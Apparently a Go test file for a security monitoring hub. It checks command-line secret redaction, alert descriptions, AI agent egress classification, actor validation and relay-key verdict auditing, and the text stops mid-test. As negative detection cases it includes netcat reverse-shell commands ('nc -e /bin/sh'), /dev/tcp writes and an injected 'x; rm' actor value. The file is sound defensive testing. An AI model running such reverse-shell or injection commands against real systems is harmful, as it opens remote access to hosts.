package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"ominull/hub/pkg/storage"
)

func TestSanitizeCommandRedactsSecretsAndShortens(t *testing.T) {
	for in, want := range map[string]string{
		"curl -H 'Authorization: Bearer abc.def' https://x":                  "curl -H 'Authorization: ***' https://x",
		"mysql --password=hunter2 -u root":                                   "mysql --password=*** -u root",
		"tool --api-key sk_live_1 run":                                       "tool --api-key *** run",
		"git clone https://user:s3cret@example.test/r.git":                   "git clone https://user:***@example.test/r.git",
		"ssh -o BatchMode=yes host qm status 112":                            "ssh -o BatchMode=yes host qm status 112",
		"echo " + strings.Repeat("A1b2", 10):                                 "echo ***",
		"env TOKEN=abc123 ./run":                                             "env TOKEN=*** ./run",
		"ssh -i /etc/nightshift/router-status.key root@10.0.0.1 status":      "ssh -i /etc/nightshift/router-status.key root@10.0.0.1 status",
		"ssh 10.0.0.234 ~/bin/st-browser-session stop c432df4a9ddc24b5a665":  "ssh 10.0.0.234 ~/bin/st-browser-session stop c432df4a9ddc24b5a665",
		"ssh 10.0.0.9 ~/.local/share/st-browser/bin/st-browser-session stop": "ssh 10.0.0.9 ~/.local/share/st-browser/bin/st-browser-session stop",
		"ls -la /etc/example-response-authority/":                            "ls -la /etc/example-response-authority/",
		"sha256sum 31430165113e51a046f3b9fa2a60ec98e073cc6c0411a081b3b1":     "sha256sum ***",
		"curl -u admin -H 'X-Api-Key: k1' --token tok1 -d password=p1":       "curl -u admin -H 'X-Api-Key: ***' --token *** -d password=***",
		"app --auth-token=\"a b\" ok":                                        "app --auth-token=*** ok",
	} {
		if got := sanitizeCommand(in); got != want {
			t.Errorf("sanitizeCommand(%q) = %q, want %q", in, got, want)
		}
	}
	long := sanitizeCommand(strings.Repeat("word ", 60))
	if n := len([]rune(long)); n > feedCommandMax || !strings.HasSuffix(long, "…") {
		t.Fatalf("long command not shortened: %d %q", n, long)
	}
}

// The v4 summary names each new paging alert in plain words with its facts;
// its severity is the worst alert's, and v1 keeps the counts-only summary.
func TestNightshiftFeedV4DescribesEachAlert(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	sweep, _ := json.Marshal(map[string]any{
		"command_line":  "ssh -o BatchMode=yes 10.0.0.9 uptime --token=abcdef",
		"sweep_targets": []map[string]any{{"ip": "10.0.0.1", "ports": []int{22}}, {"ip": "10.0.0.39", "ports": []int{22}}, {"ip": "10.0.0.9", "ports": []int{22}}},
		"admin_rule":    "10.0.0.9 was reached on port 23",
		"floor_ports":   []int{},
	})
	tuning := store.GetDetectionTuning()
	tuning.ExpectedRules = append(tuning.ExpectedRules, adminSSHRule("ws-01"))
	if _, err := store.SaveDetectionTuning(tuning, "test"); err != nil {
		t.Fatal(err)
	}
	alerts := []storage.AnomalyAlert{
		{ID: "a-sweep", EndpointID: "ws-01", Hostname: "ws-01", AnomalyType: "LATERAL_PORT_SWEEP", Severity: "HIGH",
			Title: "Lateral Port Sweep / Internal Fan-Out (3 Hosts)", ProcessPath: "/usr/bin/ssh", DstIP: "10.0.0.9", DstPort: 22,
			Evidence: string(sweep), Timestamp: now.Add(-time.Hour)},
		{ID: "a-silent", EndpointID: "srv-01", Hostname: "srv-01", AnomalyType: "ENDPOINT_SILENT", Severity: "MEDIUM",
			Title: "Agent stopped reporting on srv-01", Timestamp: now.Add(-2 * time.Hour)},
	}
	for i := 0; i < 6; i++ {
		alerts = append(alerts, storage.AnomalyAlert{ID: fmt.Sprintf("a-bw-%d", i), EndpointID: "srv-01", Hostname: "srv-01",
			AnomalyType: "BANDWIDTH_SPIKE", Severity: "LOW", Title: "Bandwidth", ProcessPath: "/usr/bin/rclone",
			DstIP: "198.51.100.7", DstPort: 443, Timestamp: now.Add(-3 * time.Hour)})
	}
	for _, a := range alerts {
		a.TenantID, a.Description = "t-01", "d"
		if err := store.CreateAnomalyAlert(a); err != nil {
			t.Fatal(err)
		}
	}
	key := "mock_admin_token"

	summary := func() (int, string, map[string]any) {
		w := feedRequest(srv, http.MethodGet, "/api/v1/health/findings", key)
		var doc feedDoc
		if err := json.Unmarshal(w.Body.Bytes(), &doc); err != nil {
			t.Fatal(err)
		}
		for _, f := range doc.Findings {
			if f.FindingInfo.UID == "ominull.anomalies.summary" {
				return f.SeverityID, f.Message, f.Unmapped
			}
		}
		t.Fatal("no summary finding")
		return 0, "", nil
	}

	sev, msg, um := summary()
	if sev != ocsfSevHigh {
		t.Errorf("severity = %d, want the worst alert's (HIGH = %d)", sev, ocsfSevHigh)
	}
	want := "ssh on ws-01 connected to 3 hosts on the local network within a minute, all on port 22 (+7 more)"
	if msg != want {
		t.Errorf("message = %q\nwant      %q", msg, want)
	}
	raw, _ := json.Marshal(um["alerts"])
	var got []feedAlert
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatal(err)
	}
	if len(got) != feedAlertMax || um["more"] != float64(8-feedAlertMax) || um["more_paging"] != float64(0) {
		t.Fatalf("listed %d alerts, more=%v more_paging=%v", len(got), um["more"], um["more_paging"])
	}
	first := got[0]
	if first.ID != "a-sweep" || first.Process != "ssh" || strings.Contains(first.Command, "abcdef") ||
		first.Destinations != "10.0.0.1:22, 10.0.0.39:22, 10.0.0.9:22" ||
		!strings.Contains(first.Cause, "10.0.0.9 was reached on port 23") || first.Expected != "" || first.At == "" {
		t.Fatalf("sweep alert = %+v", first)
	}
	if got[1].What != "The OmniNull agent on srv-01 stopped reporting" {
		t.Errorf("silent alert = %q", got[1].What)
	}
	indented, _ := json.MarshalIndent(um, "", "  ")
	if len(indented) > 4096 {
		t.Errorf("summary details are %d bytes, over Nightshift's 4 KiB cap", len(indented))
	}
}

// An alert the hub explains as the owner's own ssh is listed for the record
// and does not page; an alert that needs the owner still does, listed first.
func TestNightshiftFeedOwnAutomationDoesNotPage(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	tuning := store.GetDetectionTuning()
	tuning.ExpectedRules = append(tuning.ExpectedRules, adminSSHRule("ws-01"))
	if _, err := store.SaveDetectionTuning(tuning, "test"); err != nil {
		t.Fatal(err)
	}
	own, _ := json.Marshal(map[string]any{
		"sweep_targets": []map[string]any{{"ip": "10.0.0.1", "ports": []int{22}}, {"ip": "10.0.0.39", "ports": []int{22}}, {"ip": "10.0.0.77", "ports": []int{22}}},
		"admin_rule":    "10.0.0.77 is not an inventoried host",
		"floor_ports":   []int{},
	})
	add := func(a storage.AnomalyAlert) {
		a.TenantID, a.Description, a.Hostname = "t-01", "d", a.EndpointID
		if err := store.CreateAnomalyAlert(a); err != nil {
			t.Fatal(err)
		}
	}
	add(storage.AnomalyAlert{ID: "a-own", EndpointID: "ws-01", AnomalyType: "LATERAL_PORT_SWEEP", Severity: "CRITICAL",
		Title: "Lateral Port Sweep / Internal Fan-Out (3 Hosts)", ProcessPath: "/usr/bin/ssh", Evidence: string(own), Timestamp: now.Add(-time.Minute)})
	key := "mock_admin_token"
	type sum struct {
		SeverityID int
		Message    string
		Unmapped   map[string]any
	}
	read := func() sum {
		w := feedRequest(srv, http.MethodGet, "/api/v1/health/findings", key)
		var doc feedDoc
		if err := json.Unmarshal(w.Body.Bytes(), &doc); err != nil {
			t.Fatal(err)
		}
		for _, f := range doc.Findings {
			if f.FindingInfo.UID == "ominull.anomalies.summary" {
				return sum{f.SeverityID, f.Message, f.Unmapped}
			}
		}
		t.Fatal("no summary finding")
		return sum{}
	}
	listed := func(f sum) []feedAlert {
		raw, _ := json.Marshal(f.Unmapped["alerts"])
		var got []feedAlert
		_ = json.Unmarshal(raw, &got)
		return got
	}
	f := read()
	got := listed(f)
	if f.SeverityID != ocsfSevInformational || len(got) != 1 || got[0].Expected != "own automation" || got[0].Cause == "" {
		t.Fatalf("own ssh paged or was not explained: sev=%d %+v", f.SeverityID, got)
	}

	add(storage.AnomalyAlert{ID: "a-real", EndpointID: "srv-01", AnomalyType: "THREAT_INTEL_MATCH", Severity: "HIGH",
		Title: "Threat intel", DstIP: "203.0.113.9", DstPort: 443, Timestamp: now.Add(-time.Hour)})
	f = read()
	got = listed(f)
	if f.SeverityID != ocsfSevHigh || len(got) != 2 || got[0].ID != "a-real" || got[1].ID != "a-own" ||
		!strings.HasPrefix(f.Message, "srv-01 connected to 203.0.113.9") {
		t.Fatalf("real alert not paging first: sev=%d msg=%q %+v", f.SeverityID, f.Message, got)
	}
}

// Today's agent egress alerts as the hub stored them: two connection tests
// to public resolvers on the lab VM and codex fetching from OpenAI's CDN.
func TestDescribeAgentEgressNamesFactsAndExplainsOurs(t *testing.T) {
	t.Parallel()
	tuning := storage.DetectionTuning{}
	probeAlert := func(fields map[string]any) feedAlert {
		fields["command_line"] = "bash -c </dev/tcp/8.8.8.8/443"
		fields["domain"] = "dns.google"
		ev, _ := json.Marshal(fields)
		return describeAlert(storage.AnomalyAlert{ID: "p", AnomalyType: "AGENT_DNS_BYPASS", Severity: "HIGH", Hostname: "ominull-target-linux",
			ProcessPath: "/usr/bin/bash", DstIP: "8.8.8.8", DstPort: 443, Evidence: string(ev)}, tuning)
	}
	d := probeAlert(map[string]any{"protocol": 6, "bytes_out": 0})
	if d.What != "bash on ominull-target-linux connected straight to Google Public DNS (8.8.8.8:443), so any name lookups it made skipped the router" ||
		d.Expected != "connection test" || !strings.Contains(d.Cause, "sent nothing") {
		t.Fatalf("probe = %+v", d)
	}
	// The command line alone explains nothing: the flow must have carried
	// nothing out over TCP, and older evidence without the count only says why.
	for _, fields := range []map[string]any{{"protocol": 6, "bytes_out": 120}, {"protocol": 17, "bytes_out": 0}, {"protocol": 6}} {
		if got := probeAlert(fields); got.Expected != "" || !strings.HasPrefix(got.Cause, "Probably a connection test") {
			t.Errorf("%v explained as a connection test: %+v", fields, got)
		}
	}

	codex := describeAlert(storage.AnomalyAlert{ID: "c", AnomalyType: "AGENT_NEW_DESTINATION", Severity: "MEDIUM", Hostname: "workstation-1",
		Title:       "codex reached a destination it never has: sdmntprpolandcentral.oaiusercontent.com@cloudflare, inc.",
		ProcessPath: "/home/u/.local/lib/node_modules/@openai/codex/vendor/bin/codex", DstIP: "198.51.100.52", DstPort: 443,
		Evidence: `{"destination_owner":"Cloudflare, Inc."}`}, storage.DefaultDetectionTuning()) // OpenAI sits behind a shared CDN: no maker rule names it, so no cause
	if codex.What != "codex on workstation-1 reached sdmntprpolandcentral.oaiusercontent.com (198.51.100.52:443, Cloudflare, Inc.) for the first time" ||
		codex.Expected != "" || codex.Cause != "" {
		t.Fatalf("codex = %+v", codex)
	}
	// An upload page names the amount the new destination received.
	upload := describeAlert(storage.AnomalyAlert{ID: "u", AnomalyType: "AGENT_NEW_DESTINATION", Severity: "HIGH", Hostname: "workstation-1",
		Title:       "claude sent 4.0 MB to a destination it never has: drop.example@amazon web services (customer range)",
		ProcessPath: "/home/u/.local/share/claude/versions/2.1.301", DstIP: "198.51.100.40", DstPort: 443}, storage.DefaultDetectionTuning())
	if upload.What != "claude on workstation-1 reached drop.example (198.51.100.40:443) for the first time and sent 4.0 MB there within the hour" {
		t.Fatalf("upload page = %+v", upload)
	}
	// Claude Code's native build runs as its version number; the runtime comes
	// from agent_runtimes, so its own service is still named as the cause.
	claude := describeAlert(storage.AnomalyAlert{ID: "n", AnomalyType: "AGENT_NEW_DESTINATION", Severity: "MEDIUM", Hostname: "workstation-1",
		ProcessPath: "/home/u/.local/share/claude/versions/2.1.301", DstIP: "198.51.100.10", DstPort: 443,
		Evidence: `{"domain":"api.anthropic.com"}`}, storage.DefaultDetectionTuning())
	if claude.Expected != "" || claude.Cause != "Probably claude itself: api.anthropic.com is Anthropic's own service" ||
		claude.Process != "claude" || !strings.HasPrefix(claude.What, "claude on workstation-1 reached api.anthropic.com") {
		t.Fatalf("native claude = %+v", claude)
	}

	// A real bypass (curl to a DoH service) is not a connection test, and an
	// agent running it still asks, saying who and why.
	doh, _ := json.Marshal(map[string]any{"command_line": "curl -s https://dns.google/resolve?name=x.example", "actor": "agent:codex:fb39ca7b"})
	real := describeAlert(storage.AnomalyAlert{ID: "r", AnomalyType: "AGENT_DNS_BYPASS", Severity: "HIGH", Hostname: "ws",
		ProcessPath: "/usr/bin/curl", DstIP: "8.8.4.4", DstPort: 443, Evidence: string(doh)}, tuning)
	if real.Expected != "" || real.Actor != "Agent in Aico window fb39ca7b" ||
		real.Cause != "Agent in Aico window fb39ca7b ran it. It still asks because sending data somewhere new is what a hijacked agent would do" {
		t.Fatalf("agent bypass = %+v", real)
	}

	for _, cmd := range []string{"bash -c 'echo x >/dev/tcp/1.1.1.1/443'", "bash -c </dev/tcp/1.1.1.1/443; curl x", "nc -e /bin/sh 1.1.1.1 443", "nc -z 1.1.1.1 443 -e sh"} {
		if connectProbe(cmd) {
			t.Errorf("%q passed as a connection test", cmd)
		}
	}
	for _, cmd := range []string{"/bin/bash -c '</dev/tcp/10.0.0.1/22'", "sh -c 'timeout 3 bash -c </dev/tcp/1.0.0.1/443'", "nc -zv 1.1.1.1 443", "nc -w 3 -z host 22"} {
		if !connectProbe(cmd) {
			t.Errorf("%q not a connection test", cmd)
		}
	}
}

// An endpoint's actor explains its own sweep; a malformed actor is ignored
// and a threat-list match is never explained by who ran it.
func TestDescribeAlertActor(t *testing.T) {
	t.Parallel()
	tuning := storage.DetectionTuning{}
	sweep := func(actor string) feedAlert {
		ev, _ := json.Marshal(map[string]any{"sweep_actor": actor, "sweep_targets": []map[string]any{{"ip": "192.168.50.10", "ports": []int{22}}},
			"floor_ports": []int{}})
		return describeAlert(storage.AnomalyAlert{ID: "s", AnomalyType: "LATERAL_PORT_SWEEP", Severity: "HIGH", Hostname: "ws",
			ProcessPath: "/usr/bin/ssh", Evidence: string(ev)}, tuning)
	}
	if got := sweep("agent:claude:fb39ca7b"); got.Expected != "Agent in Aico window fb39ca7b" || got.Cause != "Agent in Aico window fb39ca7b ran it" {
		t.Fatalf("agent sweep = %+v", got)
	}
	if got := sweep("agent:codex:"); got.Expected != "Codex session outside Aico" {
		t.Fatalf("codex outside Aico = %+v", got)
	}
	if got := sweep("service:nightshift:nightshift-check.service"); got.Expected != "Nightshift (nightshift-check.service)" {
		t.Fatalf("service sweep = %+v", got)
	}
	for _, bad := range []string{"agent:evil:fb39ca7b", "agent:claude:ZZZ", "service:other:x.service", "service:nightshift:x; rm", "agent:claude:fb39ca7b "} {
		if got := sweep(bad); got.Expected != "" || got.Actor != "" {
			t.Errorf("actor %q accepted: %+v", bad, got)
		}
	}
	// A sweep touching a floor port is never Expected, whoever ran it: an
	// owner-writable binary can claim to be an agent.
	for _, ports := range [][]int{{445}, {22, 3389}, {23}, {135, 80}} {
		ev, _ := json.Marshal(map[string]any{"sweep_actor": "agent:claude:fb39ca7b", "sweep_targets": []map[string]any{
			{"ip": "192.168.50.10", "ports": ports}, {"ip": "192.168.50.11", "ports": []int{22}}}, "floor_ports": []int{}})
		got := describeAlert(storage.AnomalyAlert{ID: "f", AnomalyType: "LATERAL_PORT_SWEEP", Severity: "HIGH", Hostname: "ws",
			ProcessPath: "/home/u/.local/share/claude/versions/9/x", Evidence: string(ev)}, tuning)
		if got.Expected != "" || !strings.Contains(got.Cause, "It still asks because it reached SMB, RDP") {
			t.Fatalf("floor-port sweep %v = %+v", ports, got)
		}
	}
	// The same holds without an actor and with the single-target shape.
	if got := describeAlert(storage.AnomalyAlert{ID: "g", AnomalyType: "LATERAL_PORT_SWEEP", Severity: "HIGH", Hostname: "ws",
		DstIP: "192.168.50.10", DstPort: 445, Evidence: `{"sweep_actor":"agent:claude:fb39ca7b"}`}, tuning); got.Expected != "" {
		t.Fatalf("single-target floor sweep = %+v", got)
	}
	// The evidence lists ten hosts; floor_ports covers the whole window. A
	// sweep whose 445 hosts sort past the ten listed (all on port 80) is still
	// a floor sweep, and says so.
	var ten []map[string]any
	for i := 10; i < 20; i++ {
		ten = append(ten, map[string]any{"ip": fmt.Sprintf("192.168.50.%d", i), "ports": []int{80}})
	}
	ev, _ := json.Marshal(map[string]any{"sweep_actor": "agent:claude:fb39ca7b", "sweep_targets": ten, "floor_ports": []int{445}})
	hidden := describeAlert(storage.AnomalyAlert{ID: "h", AnomalyType: "LATERAL_PORT_SWEEP", Severity: "CRITICAL", Hostname: "ws",
		Title: "Lateral Port Sweep / Internal Fan-Out (20 Hosts)", ProcessPath: "/home/u/.local/bin/x", DstIP: "192.168.50.19", DstPort: 80,
		Evidence: string(ev)}, tuning)
	if hidden.Expected != "" || !strings.Contains(hidden.Cause, "It still asks because it reached SMB, RDP") ||
		!strings.Contains(hidden.What, "20 hosts") || !strings.Contains(hidden.What, "445") {
		t.Fatalf("floor port past the listed ten = %+v", hidden)
	}
	// Evidence that does not record the window's floor ports (older alerts,
	// or unreadable evidence) is read as a floor sweep.
	for _, raw := range []string{`{"sweep_actor":"agent:claude:fb39ca7b","sweep_targets":[{"ip":"192.168.50.10","ports":[22]}]}`,
		`{"sweep_actor":"agent:claude:fb39ca7b","floor_ports":"none"}`, `not json`, ``} {
		got := describeAlert(storage.AnomalyAlert{ID: "u", AnomalyType: "LATERAL_PORT_SWEEP", Severity: "HIGH", Hostname: "ws",
			ProcessPath: "/usr/bin/ssh", DstIP: "192.168.50.10", DstPort: 22, Evidence: raw}, storage.DetectionTuning{ExpectedRules: []storage.ExpectedRule{adminSSHRule("ws")}})
		if got.Expected != "" {
			t.Errorf("evidence %q without floor ports explained: %+v", raw, got)
		}
		if got.Actor != "" && !strings.Contains(got.Cause, "does not record every port") {
			t.Errorf("evidence %q cause = %q", raw, got.Cause)
		}
	}
	ti := describeAlert(storage.AnomalyAlert{ID: "t", AnomalyType: "THREAT_INTEL_MATCH", Severity: "HIGH", Hostname: "ws", DstIP: "203.0.113.9",
		Evidence: `{"actor":"agent:claude:fb39ca7b"}`}, tuning)
	if ti.Expected != "" || !strings.Contains(ti.Cause, "never explained") {
		t.Fatalf("threat intel = %+v", ti)
	}
}

// The digest names what the agent runtimes did (recorded findings) and never
// asks.
func TestAgentEgressDigestIsInformationalAndNamed(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	for i, ip := range []string{"8.8.8.8", "1.0.0.1"} {
		ev, _ := json.Marshal(map[string]any{"command_line": "bash -c </dev/tcp/" + ip + "/443", "protocol": 6, "bytes_out": 0})
		if err := store.CreateAnomalyAlert(storage.AnomalyAlert{ID: fmt.Sprintf("p%d", i), TenantID: "t-01", EndpointID: "lab", Hostname: "ominull-target-linux",
			AnomalyType: "AGENT_DNS_BYPASS", Severity: "HIGH", Title: "bash resolving names outside the estate's resolvers", ProcessPath: "/usr/bin/bash",
			DstIP: ip, DstPort: 443, Evidence: string(ev), HeldReason: storage.HeldHunt, Timestamp: now.Add(-time.Minute)}); err != nil {
			t.Fatal(err)
		}
	}
	key := "mock_admin_token"
	w := feedRequest(srv, http.MethodGet, "/api/v1/health/findings", key)
	var doc feedDoc
	if err := json.Unmarshal(w.Body.Bytes(), &doc); err != nil {
		t.Fatal(err)
	}
	seen := 0
	for _, f := range doc.Findings {
		switch f.FindingInfo.UID {
		case "ominull.anomalies.digest", "ominull.anomalies.agent_egress":
			seen++
			if f.SeverityID != ocsfSevInformational || f.StatusID != ocsfStatusNew ||
				!strings.Contains(f.Message, "bash on ominull-target-linux connected straight to") ||
				!strings.Contains(f.Message, "(connection test)") || strings.Contains(f.Message, "resolver bypasses") {
				t.Errorf("digest = %d %q", f.SeverityID, f.Message)
			}
		case "ominull.anomalies.summary":
			seen++
			if f.SeverityID != ocsfSevInformational {
				t.Errorf("connection tests paged the summary: %d %q", f.SeverityID, f.Message)
			}
		}
	}
	if seen != 3 {
		t.Fatalf("summary, digest and agent egress digest not all in the feed (%d)", seen)
	}
}

// One verdict from Nightshift confirms the listed alerts benign; the relay
// key cannot confirm anything else.
func TestRelayAlertVerdict(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	add := func(id, kind, sev string, at time.Time, held string) {
		if err := store.CreateAnomalyAlert(storage.AnomalyAlert{ID: id, TenantID: "t-01", EndpointID: "ws", Hostname: "ws",
			AnomalyType: kind, Severity: sev, Title: "alert", HeldReason: held, Timestamp: at}); err != nil {
			t.Fatal(err)
		}
	}
	hour := now.Add(-time.Hour)
	add("open", "LATERAL_PORT_SWEEP", "HIGH", hour, "")
	add("old", "LATERAL_PORT_SWEEP", "HIGH", now.Add(-48*time.Hour), "")
	add("hunt", "LATERAL_PORT_SWEEP", "HIGH", hour, storage.HeldHunt)
	add("low", "LATERAL_PORT_SWEEP", "MEDIUM", hour, "")
	add("intel", "THREAT_INTEL_MATCH", "CRITICAL", hour, "")
	add("beacon", "C2_BEACONING", "HIGH", hour, "")
	issue := postAdmin(srv, "/api/v1/integrations/nightshift/approval-key", ``)
	var k struct {
		Key string `json:"key"`
	}
	_ = json.Unmarshal(issue.Body.Bytes(), &k)
	post := func(body, key string) (int, map[string]any) {
		req := httptest.NewRequest(http.MethodPost, "/api/v1/integrations/nightshift/alerts/verdict", strings.NewReader(body))
		req.Header.Set("X-API-Key", key)
		w := httptest.NewRecorder()
		srv.Handler().ServeHTTP(w, req)
		var out map[string]any
		_ = json.Unmarshal(w.Body.Bytes(), &out)
		return w.Code, out
	}
	if code, _ := post(`{"ids":["open"]}`, "mock_admin_token"); code != http.StatusUnauthorized {
		t.Fatalf("admin key on the verdict relay: %d", code)
	}
	code, out := post(`{"ids":["open","old","hunt","low","intel","beacon","missing"]}`, k.Key)
	if code != http.StatusOK || out["confirmed"] != float64(1) || len(out["skipped"].([]any)) != 6 {
		t.Fatalf("verdict = %d %v", code, out)
	}
	reason, by, _, ok := store.AnomalyResolution("open")
	if !ok || by != "owner via Nightshift" || !strings.Contains(reason, "that was me") {
		t.Fatalf("resolution = %q %q %v", reason, by, ok)
	}
	if _, _, _, ok := store.AnomalyResolution("old"); ok {
		t.Fatal("an alert outside the feed window was confirmed")
	}
	// The answer closed a HIGH finding, so the detection-policy note counts it.
	// It names the relay key that closed it, not an unknown credential.
	f := feedNote(t, srv, "ominull.detection.changes")
	if !strings.HasPrefix(f.Message, "1 finding acknowledged (1 HIGH or CRITICAL)") {
		t.Fatalf("note after the verdict = %q", f.Message)
	}
	dismissed, _ := f.Unmapped["dismissed"].([]map[string]any)
	if len(dismissed) != 1 || !strings.Contains(dismissed[0]["change"].(string), "credential relay-key (unverified)") {
		t.Fatalf("dismissed after the verdict = %v", dismissed)
	}
	// The relay key was issued in the window by an admin-key holder, so the
	// note says so beside the closure it made.
	issued, _ := f.Unmapped["relay_key_issued"].([]map[string]any)
	if len(issued) != 1 || !strings.Contains(issued[0]["change"].(string), "credential api-key (unverified)") {
		t.Fatalf("relay key issuance on the note = %v", f.Unmapped["relay_key_issued"])
	}
	if !strings.Contains(f.Message, "the Nightshift relay key was issued 1 time in the last 24 h") ||
		!strings.Contains(f.Message, "need not be Nightshift's own verdict") {
		t.Fatalf("note does not name the relay key issuance: %q", f.Message)
	}
	if last, _ := f.Unmapped["relay_key_last_issued"].(map[string]any); last["at"] != issued[0]["at"] {
		t.Fatalf("relay_key_last_issued = %v, want the issuance %v", f.Unmapped["relay_key_last_issued"], issued[0])
	}
}

// Reissuing the relay key shows on the detection-policy note on its own, and
// a relay-key closure names when the key that made it was issued even when
// that was before the window.
func TestRelayKeyIssuanceOnTheDetectionPolicyNote(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	f := feedNote(t, srv, "ominull.detection.changes")
	if f.StatusID != ocsfStatusResolved || f.Unmapped["relay_key_issued"] != nil {
		t.Fatalf("note before any issuance = %+v", f)
	}

	// An issuance before the window, then a relay-key closure in it.
	if err := store.RecordAudit(storage.AuditEntry{ID: "old-issue", Username: "admin", Action: relayKeyIssuedAudit,
		Resource: "nightshift", Details: "Issued the Nightshift relay key", Timestamp: now.Add(-72 * time.Hour)}); err != nil {
		t.Fatal(err)
	}
	if err := store.RecordAudit(storage.AuditEntry{ID: "relay-close", Username: "nightshift-relay", Action: findingsAcknowledgedAudit,
		Resource: "findings", Details: "acknowledged 1 finding, 1 HIGH or CRITICAL (LATERAL_PORT_SWEEP); credential relay-key (unverified)",
		Timestamp: now.Add(-time.Hour)}); err != nil {
		t.Fatal(err)
	}
	f = feedNote(t, srv, "ominull.detection.changes")
	last, _ := f.Unmapped["relay_key_last_issued"].(map[string]any)
	if last["at"] != now.Add(-72*time.Hour).Format(time.RFC3339) || last["by"] != "admin" {
		t.Fatalf("relay_key_last_issued = %v", f.Unmapped["relay_key_last_issued"])
	}
	if f.Unmapped["relay_key_issued"] != nil || strings.Contains(f.Message, "relay key") {
		t.Fatalf("an issuance outside the window shows as one in it: %q %v", f.Message, f.Unmapped["relay_key_issued"])
	}

	// A closure by another credential does not bring in the issuance.
	srv2, store2 := setupTestServer(t)
	defer store2.Close()
	if err := store2.RecordAudit(storage.AuditEntry{ID: "old-issue", Username: "admin", Action: relayKeyIssuedAudit,
		Resource: "nightshift", Details: "Issued", Timestamp: now.Add(-72 * time.Hour)}); err != nil {
		t.Fatal(err)
	}
	if err := store2.RecordAudit(storage.AuditEntry{ID: "api-close", Username: "admin", Action: findingsAcknowledgedAudit,
		Resource: "findings", Details: "acknowledged 1 finding, 0 HIGH or CRITICAL; credential api-key (unverified)",
		Timestamp: now.Add(-time.Hour)}); err != nil {
		t.Fatal(err)
	}
	if f := feedNote(t, srv2, "ominull.detection.changes"); f.Unmapped["relay_key_last_issued"] != nil {
		t.Fatalf("relay_key_last_issued without a relay-key closure = %v", f.Unmapped["relay_key_last_issued"])
	}

	// Reissuing with no closure at all still makes the note new and says who.
	srv3, store3 := setupTestServer(t)
	defer store3.Close()
	if w := postAdmin(srv3, "/api/v1/integrations/nightshift/approval-key", ``); w.Code != http.StatusOK {
		t.Fatalf("issue = %d %s", w.Code, w.Body.String())
	}
	f = feedNote(t, srv3, "ominull.detection.changes")
	issued, _ := f.Unmapped["relay_key_issued"].([]map[string]any)
	if f.StatusID != ocsfStatusNew || len(issued) != 1 ||
		!strings.HasPrefix(f.Message, "the Nightshift relay key was issued 1 time in the last 24 h, last by ") {
		t.Fatalf("note after a reissue = %d %q %v", f.StatusID, f.Message, issued)
	}
	if f.Unmapped["relay_key_last_issued"] != nil {
		t.Fatalf("relay_key_last_issued without a relay-key closure = %v", f.Unmapped["relay_key_last_issued"])
	}
}

// Issuing relay keys in a loop cannot grow the note without bound: the list
// keeps the newest issuances, says how many it left out, and the message
// still gives the full count.
func TestRelayKeyIssuanceListIsCapped(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	total := feedDismissedListShown + 7
	for i := 0; i < total; i++ {
		if err := store.RecordAudit(storage.AuditEntry{ID: fmt.Sprintf("issue-%03d", i), Username: "admin", Action: relayKeyIssuedAudit,
			Resource: "nightshift", Details: "Issued the Nightshift relay key",
			Timestamp: now.Add(-time.Duration(total-i) * time.Minute)}); err != nil {
			t.Fatal(err)
		}
	}
	f := feedNote(t, srv, "ominull.detection.changes")
	issued, _ := f.Unmapped["relay_key_issued"].([]map[string]any)
	if len(issued) != feedDismissedListShown {
		t.Fatalf("relay_key_issued has %d rows, want %d", len(issued), feedDismissedListShown)
	}
	if got := f.Unmapped["relay_key_issued_omitted"]; fmt.Sprint(got) != "7" {
		t.Fatalf("relay_key_issued_omitted = %v, want 7", got)
	}
	newest := now.Add(-time.Minute).Format(time.RFC3339)
	if issued[0]["at"] != newest {
		t.Fatalf("first listed issuance at %v, want the newest %s", issued[0]["at"], newest)
	}
	if !strings.Contains(f.Message, fmt.Sprintf("issued %d times in the last 24 h", total)) {
		t.Fatalf("message = %q, want the full count %d", f.Message, total)
	}
}

// The alerts that page are listed first, and more_paging counts the unlisted
// ones that would: report-only alerts never hide a page, and a reader that
// explains every listed page knows whether anything unseen still asks.
func TestNightshiftFeedListsPagesFirstAndCountsUnlistedPages(t *testing.T) {
	t.Parallel()
	srv, store := setupTestServer(t)
	defer store.Close()
	now := time.Now().UTC()
	add := func(id, sev string, age time.Duration) {
		t.Helper()
		if err := store.CreateAnomalyAlert(storage.AnomalyAlert{ID: id, TenantID: "t-01", EndpointID: "srv-01", Hostname: "srv-01",
			AnomalyType: "ENDPOINT_SILENT", Severity: sev, Title: "Agent stopped reporting on srv-01", Description: "d",
			Timestamp: now.Add(-age)}); err != nil {
			t.Fatal(err)
		}
	}
	// Five newer report-only alerts and one older page.
	for i := 0; i < 5; i++ {
		add(fmt.Sprintf("m-%d", i), "MEDIUM", time.Duration(i+1)*time.Minute)
	}
	add("h-0", "HIGH", time.Hour)
	key := "mock_admin_token"
	summary := func() (map[string]any, []feedAlert) {
		t.Helper()
		w := feedRequest(srv, http.MethodGet, "/api/v1/health/findings", key)
		var doc feedDoc
		if err := json.Unmarshal(w.Body.Bytes(), &doc); err != nil {
			t.Fatal(err)
		}
		for _, f := range doc.Findings {
			if f.FindingInfo.UID == "ominull.anomalies.summary" {
				raw, _ := json.Marshal(f.Unmapped["alerts"])
				var got []feedAlert
				if err := json.Unmarshal(raw, &got); err != nil {
					t.Fatal(err)
				}
				return f.Unmapped, got
			}
		}
		t.Fatal("no summary finding")
		return nil, nil
	}
	um, got := summary()
	if len(got) != feedAlertMax || got[0].ID != "h-0" || got[1].ID != "m-0" || um["more"] != float64(1) || um["more_paging"] != float64(0) {
		t.Fatalf("first=%s second=%s more=%v more_paging=%v", got[0].ID, got[1].ID, um["more"], um["more_paging"])
	}
	// Six pages: one cannot be listed, and it is counted.
	for i := 1; i < 6; i++ {
